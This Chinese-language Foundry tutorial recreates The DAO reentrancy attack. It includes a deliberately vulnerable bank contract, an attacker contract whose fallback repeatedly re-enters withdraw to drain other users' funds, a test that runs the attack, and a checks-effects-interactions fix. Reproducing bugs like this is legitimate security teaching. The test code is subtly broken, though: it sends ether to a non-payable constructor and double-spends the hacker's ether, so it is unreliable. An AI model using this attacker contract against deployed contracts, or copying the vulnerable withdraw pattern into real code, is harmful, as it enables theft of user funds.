在Foundry环境下复现TheDAO漏洞问题并修复！

The DAO 事件的核心漏洞是经典的“重入攻击”（Reentrancy Attack）。在 Foundry 框架下复现这个问题，核心思路是构建两个合约：一个存在“先转账、后更新余额”逻辑缺陷的受害者合约，以及一个利用回调函数不断“递归提款”的攻击合约。

以下是在 Foundry 环境下复现该漏洞的完整实战步骤：

🛠️ 第一步：环境准备与项目初始化

确保你已安装 Foundry。在终端执行 foundryup 获取最新版本。
创建并进入一个新的 Foundry 项目：
forge init dao-reentrancy-poc
cd dao-reentrancy-poc

（可选）安装 OpenZeppelin 合约库，便于后续编写防御代码：
forge install OpenZeppelin/openzeppelin-contracts

💻 第二步：编写存在漏洞的合约与攻击合约

在项目的 src 目录下，创建一个名为 ReentrancyAttack.sol 的文件，将以下代码复制进去：

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 @title VulnerableBank
 @notice 模拟 The DAO 中存在重入漏洞的资金池合约
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // 存款功能
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 提现功能 - 存在致命漏洞：先转账，后更新余额
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance to withdraw");

        // 漏洞点：在更新状态变量之前进行外部调用
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // 如果外部调用触发了重入，这行代码还没来得及执行
        balances[msg.sender] = 0;
    }

    // 方便查看合约总余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 @title ReentrancyAttacker
 @notice 模拟黑客的恶意攻击合约
 */
contract ReentrancyAttacker {
    VulnerableBank public targetBank;

    constructor(address _targetBankAddress) {
        targetBank = VulnerableBank(_targetBankAddress);
    }

    // 攻击启动函数：先存入少量资金，然后发起第一次提现
    function attack() external payable {
        require(msg.value > 0, "Need some ETH to start the attack");
        targetBank.deposit{value: msg.value}();
        targetBank.withdraw();
    }

    // 接收 ETH 的回退函数 - 攻击的核心
    fallback() external payable {
        // 当目标合约给我们转账时，fallback会被触发
        // 只要目标合约里还有钱，我们就再次调用它的提现功能
        if (address(targetBank).balance >= msg.value) {
            targetBank.withdraw();
        }
    }

    // 提现盗取的资金
    function withdrawStolenFunds(address payable _to) external {
        _to.transfer(address(this).balance);
    }
}

🧪 第三步：编写 Foundry 测试用例进行复现

在 test 目录下，修改或新建 Reentrancy.t.sol 文件，编写测试脚本来模拟整个攻击过程：

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/ReentrancyAttack.sol";

contract ReentrancyTest is Test {
    VulnerableBank public bank;
    ReentrancyAttacker public attacker;
    
    address public user = makeAddr("user");
    address public hacker = makeAddr("hacker");

    function setUp() public {
        // 1. 部署受害者合约
        bank = new VulnerableBank();
        
        // 2. 模拟正常用户存入 10 ETH
        vm.deal(user, 10 ether);
        vm.prank(user);
        bank.deposit{value: 10 ether}();

        // 3. 部署攻击合约
        vm.deal(hacker, 1 ether);
        vm.prank(hacker);
        attacker = new ReentrancyAttacker{value: 1 ether}(address(bank));
    }

    function testReentrancyAttack() public {
        // 攻击前状态检查
        console.log("=== 攻击前状态 ===");
        console.log("受害者合约余额:", bank.getBalance());
        console.log("黑客合约余额:", address(attacker).balance);

        // 4. 黑客发起重入攻击
        vm.prank(hacker);
        attacker.attack{value: 1 ether}();

        // 攻击后状态检查
        console.log("n=== 攻击后状态 ===");
        console.log("受害者合约余额:", bank.getBalance());
        console.log("黑客合约余额:", address(attacker).balance);

        // 断言：受害者合约的资金被完全掏空
        assertEq(bank.getBalance(), 0, "Bank should be drained!");
    }
}

⚡ 第四步：运行测试并查看结果

在终端执行以下命令运行测试：
forge test --match-test testReentrancyAttack -vv

预期结果：
你会发现，尽管黑客最初只存入了 1 ETH，但由于 VulnerableBank 在转账时触发了攻击合约的 fallback 函数，导致 withdraw 被反复递归调用。最终，受害者合约中原本属于正常用户的 10 ETH 连同黑客的本金会被全部转走，合约余额归零。

🛡️ 延伸思考：如何防御？

The DAO 事件后，社区总结了标准的防御方案，最常用的是“检查-生效-交互”（Checks-Effects-Interactions）模式以及使用 重入锁（Reentrancy Guard）。

你可以尝试将 VulnerableBank 的 withdraw 函数修改为以下安全写法，再次运行测试，你会发现攻击将无法生效：

// 防御写法：先更新状态，再进行转账交互
function withdraw() public {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "No balance to withdraw");

    // 1. 先清零余额（生效）
    balances[msg.sender] = 0;

    // 2. 再进行转账（交互）
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
}

通过这样的实战复现，你可以非常直观地理解 The DAO 漏洞的底层原理以及 Foundry 在智能合约安全审计中的强大作用。
